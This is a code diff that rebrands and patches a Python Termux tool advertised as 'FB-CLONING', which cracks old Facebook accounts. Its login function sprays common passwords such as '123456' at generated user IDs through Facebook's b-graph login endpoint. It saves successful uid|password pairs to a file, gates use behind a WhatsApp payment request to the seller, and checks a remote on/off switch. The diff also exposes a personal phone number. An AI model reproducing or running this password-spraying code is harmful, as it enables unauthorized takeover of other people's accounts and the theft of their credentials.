@@ -42,30 +42,31 @@ def linex():print(f'''{white}━━━━━━━━━━━━━━━━━
 def ____banner____():
     if 'win' in sys.platform:
         os.system('clear')
-    #os.system('xdg-open https://facebook.com/groups/https://www.facebook.com/mosabbir2025 /')
+    #os.system('xdg-open https://facebook.com/groups/httpsm.facebook.comgrouptermuxhackerMOSABBIR/')
     print(f'''  
-                               
- __  __                 _     _     _      
+  __  __                 _     _     _      
  |  \/  |               | |   | |   (_)     
  | \  / | ___  ___  __ _| |__ | |__  _ _ __ 
  | |\/| |/ _ \/ __|/ _` | '_ \| '_ \| | '__|
  | |  | | (_) \__ \ (_| | |_) | |_) | | |   
  |_|  |_|\___/|___/\__,_|_.__/|_.__/|_|_|   
-                                                                                                                                                                                                                                             
-\x1b[1;96m  ┏━━━━━━━━━━━━━━━━━━━\x1b[38;5;46m~🎀♡ 𝖬𝖔𝘴𝗮𝖇𝗯ḭṛ ♡🎀~\x1b[1;39m\x1b[1;96m━━━━━━━━━━━━━━━━━━━━━┓
-\x1b[1;39m     \x1b[1;95m❣︎[𖣘]☔︎\x1b[1;96m𝙉𝘼𝙈𝙀\x1b[1;34m        : [★] MOSABBIR HOSSAIN \x1b[1;39m            
+                                            
+                                            
+
+\x1b[1;96m  ┏━━━━━━━━━━━━━━━━━━━\x1b[38;5;46mMosabbir\x1b[1;39m\x1b[1;96m━━━━━━━━━━━━━━━━━━━━━┓
+\x1b[1;39m     \x1b[1;95m❣︎[𖣘]☔︎\x1b[1;96m𝙉𝘼𝙈𝙀\x1b[1;34m        : [★] MOSABBIR HOSSAIN\x1b[1;39m            
 \x1b[1;39m     \x1b[1;95m❣︎[𖣘]☔︎\x1b[1;96m𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆\x1b[1;34m    : [★] 𝐓𝐄𝐑𝐌𝐔𝐱 𝐇𝐀𝐂𝐊𝐄𝐑 MOSABBIR\x1b[1;39m   
 \x1b[1;39m     \x1b[1;95m❣︎[𖣘]☔︎\x1b[1;96m𝙂𝙄𝙏𝙃𝙐𝘽\x1b[1;34m      : [★] MOSABBIR-𝗖𝗬𝗕𝗘𝗥 \x1b[1;39m          
 \x1b[1;39m     \x1b[1;95m❣︎[𖣘]☔︎\x1b[1;96m𝙍𝙄𝙇𝙄𝙂𝙀𝙎𝙃𝙊𝙉\x1b[1;34m  : [★] 𝗕𝗔𝗡𝗚𝗟𝗔𝗗𝗘𝗦𝗛𝗜\x1b[1;39m        
 \x1b[1;39m     \x1b[1;95m❣︎[𖣘]☔︎\x1b[1;96m𝙒𝙃𝘼𝙏𝙎𝘼𝙋𝙋\x1b[1;34m    : [★] +8801725825367\x1b[1;39m     
 \x1b[1;39m     \x1b[1;95m❣︎[𖣘]☔︎\x1b[1;96m𝙏𝙊𝙊𝙇𝙎 𝙉𝘼𝙈𝙀\x1b[1;34m  : [★] FB-𝐂𝐋𝐎𝐍𝐈𝐍𝐆\x1b[1;39m     
 \x1b[1;39m     \x1b[1;95m❣︎[𖣘]☔︎\x1b[1;96m𝙏𝙊𝙊𝙇𝙎 𝙎𝙏𝘼𝙏𝙐𝙎\x1b[1;34m: [★] UPDATE \x1b[38;5;46m [v 1.8.5]\x1b[38;5;46m           
-\x1b[1;96m   ┗━━━━━━━━━━━━━━━━━━━\x1b[1;31mmosabbir\x1b[1;39m\x1b[1;96m━━━━━━━━━━━━━━━━━━━━┛\x1b[1;96m''')
+\x1b[1;96m   ┗━━━━━━━━━━━━━━━━━━━\x1b[1;31mMosabbir\x1b[1;39m\x1b[1;96m━━━━━━━━━━━━━━━━━━━━┛\x1b[1;96m''')
 #__________/APROVEL\__________#
-def main_apv():
+def main():
     clear()
     uuid = str(os.geteuid())
-    key = f'''shamim{uuid!s}'''
+    key = f'''MOSABBIR{uuid!s}'''
     clear()
     print('\x1b[1;34m[\x1b[38;5;46m×\x1b[1;34m] \x1b[1;37m|\x1b[38;5;46mKEY\x1b[1;37m|\x1b[38;5;196m' + key)
     print('\x1b[1;37m═════════════════════════════════════════')
@@ -113,13 +114,20 @@ def main_apv():
     print(f'''{white}│\x1b[1;100m/•YOU\'RE\x1b[00m\x1b[1;91m\x1b[47mNEXT\'•/\x1b[00m{white}│{G1}[{Y}×/''' + f'''\xc3\x97{G1}]{white}│\x1b[1;100m/•STEP\x1b[00m\x1b[1;91m\x1b[47mADMIN•/\x1b[00m{white}│''')
     print(f'''{white}╰─ ┌─────────────────────────────────────╯''')
     choice = input(f'''{white}   └──> {white}<{red}/{white}ENTER{red}/{white}>  ''')
-    url_wa = 'https://api.whatsapp.com/send?phone=+8801884250097&text='
-    tks = 'Hi SHAMIM Sir, I Need To Buy Your EXO Tools Version 1.0 Premium Please Accept My Key To Premium\n\n Name : ' + enter + '\n : ' + choice + '\n Key : ' + key + '\n Buy Select : ' + Picchi
+    url_wa = 'https://api.whatsapp.com/send?phone=+8801725825367&text='
+    tks = 'Hi MOSABBIR Sir, I Need To Buy Your EXO Tools Version 1.0 Premium Please Accept My Key To Premium\n\n Name : ' + enter + '\n : ' + choice + '\n Key : ' + key + '\n Buy Select : ' + Picchi
     subprocess.check_output(['am','start',url_wa + tks])
     time.sleep(2)
     print('\x1b[1;37m═════════════════════════════════════════\nRun\x1b[1;32m[\x1b[1;31m-\x1b[1;32m] \x1b[1;37m again with permission from admin')
-    main_apv()
+    main()
     sys.exit()
+#__________/MENU\__________#
+def _old_():
+    clear();time.sleep(2);print(f'''{rad}[{white}A{rad}] {green} YOUR KEY HAS BEEN APRV''');clear();print(f'''{rad}[{white}A{rad}] {green}Old Id Clone''');print(f'''{rad}[{white}B{rad}] {green}ADMIN CONTACT''');linex();sharo = input(f'''{rad}[{white}◆{rad}] {green}Selection  {white}▶︎ {yelloww}''')
+    if sharo in ('A', 'a', '01', '1'):__Old__()
+    elif sharo in ('B', 'b', '02', '2'):_old_()
+    #os.system('xdg-open https://api.whatsapp.com/send?phone=+8801725825367')
+    else:print(f'''\n[×]{rad} Choose Value Option... ''');_old_()
 #__________/OLD\__________#
 def __Old__():
     clear();print(f'''{rad}[{white}1{rad}] Old code {yellow}:{green} 2010-2014''');ask = input(f'''{rad}[{white}◆{rad}] Select {yellow}:{green} ''');linex();clear();print(f'''{rad}[{white}◆{rad}] Example {yellow}:{green} 20000 / 30000 / 99999''');limit = input(f'''{rad}[{white}◆{rad}] Select {yellow}:{green} ''');linex()
@@ -146,7 +154,7 @@ def __Old__():
 #__________/METHOD-1\__________#
 def login(uid):
     global oks,loop
-    sys.stdout.write(f'''\r\r{yelloww} - {white}[{green}MOSABBIR {white}]{yelloww} -{white} [{loop}{white}] {yelloww}- {white}[{green}OK {yelloww}- {green}{len(oks)}{white}]''');sys.stdout.flush()
+    sys.stdout.write(f'''\r\r{yelloww} - {white}[{green}MOSABBIR{white}]{yelloww} -{white} [{loop}{white}] {yelloww}- {white}[{green}OK {yelloww}- {green}{len(oks)}{white}]''');sys.stdout.flush()
     Session = requests.session()
     try:
         for pw in ('123456', '1234567', '123456789'):
@@ -155,18 +163,18 @@ def login(uid):
             url = 'https://b-graph.facebook.com/auth/login'
             rp = requests.post(url, data = data, headers = head, allow_redirects = False, verify = True).json()
             if 'session_key' in rp:
-                print(f'''\r\r{white}[{green}MOSABBIR {yelloww}-{green}OK{white}] {green}{uid} | {white}[🔑]{pw}''')
+                print(f'''\r\r{white}[{green}MOSABBIR{yelloww}-{green}OK{white}] {green}{uid} | {white}[🔑]{pw}''')
                 ProfileLink = f'''https://www.facebook.com/profile.php?id={str(uid)}'''
                 if 'y' in show_link:
                     print(f'''\x1b[1;92m[PROFILE LINK]…[ 🍪 ] {ProfileLink}  ''');linex()
-                open('/sdcard/MOSABBIR -OLD-OK.txt', 'a').write(uid + '|' + pw + '\n')
+                open('/sdcard/MOSABBIR-OLD-OK.txt', 'a').write(uid + '|' + pw + '\n')
                 cps.append(uid)
             elif 'www.facebook.com' in rp['error']['message']:
-                print(f'''\r\r{white}[{green}MOSABBIR {yelloww}-{green}OK{white}] {green}{uid} | {white}[🔑]{pw}''')
+                print(f'''\r\r{white}[{green}MOSABBIR{yelloww}-{green}OK{white}] {green}{uid} | {white}[🔑]{pw}''')
                 ProfileLink = f'''https://www.facebook.com/profile.php?id={str(uid)}'''
                 if 'y' in show_link:
                     print(f'''\x1b[1;92m[PROFILE LINK]…[ 🍪 ] {ProfileLink}  ''');linex()
-                open('/sdcard/MOSABBIR -OLD-OK.txt', 'a').write(uid + '|' + pw + '\n')
+                open('/sdcard/MOSABBIR-OLD-OK.txt', 'a').write(uid + '|' + pw + '\n')
                 oks.append(uid)
                 break
             else:continue
@@ -175,16 +183,16 @@ def login(uid):
         pass
 #__________/DATA-BASE\__________#
 def server():
-    database = requests.get('https://raw.githubusercontent.com/Noor-143/Control-room/main/ON-OFF-UPDATE-FREE-TRAIL.txt).text
+    database = requests.get('https://raw.githubusercontent.com/Noor-143/Control-room/main/ON-OFF-UPDATE-FREE-TRAIL.txt').text
     if 'on' in database:
-        print('\x1b[38;5;46m[✔️TOOL IS O')
+        print('\x1b[38;5;46m[✔️TOOL IS ON')
     elif 'off' in database:
         print('\x1b[38;5;46m[✔️TOOL IS UPDATING')
         for j in range(4000):
             time.sleep(4)
-            #os.system('xdg-open https://t.me/termux_hacker_MOSABBIR ')
+            #os.system('xdg-open https://t.me/termux_hacker_MOSABBIR')
             print('\x1b[1;92m Tool is updating Wait For Complete The Update')
             print(' internet error ')
             sys.exit()
 #__________/END-CALL\__________#
-server();main_apv()
+server();main()
